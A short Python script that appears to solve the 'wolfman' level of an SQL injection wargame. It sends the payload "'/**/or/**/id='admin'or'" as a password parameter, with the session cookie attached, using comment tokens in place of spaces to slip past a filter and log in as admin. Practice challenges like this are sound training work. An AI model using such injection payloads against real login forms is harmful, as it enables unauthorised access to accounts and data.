import requests
from settings import session_id
from bs4_utils import print_html

url = "https://los.rubiya.kr/chall/wolfman_4fdc56b75971e41981e3d1e2fbe9b7f7.php"
cookies = {'PHPSESSID': session_id}

params = {
    'pw': "'/**/or/**/id='admin'or'"
}
response = requests.get(url, params=params, cookies=cookies)
print_html(response.text)
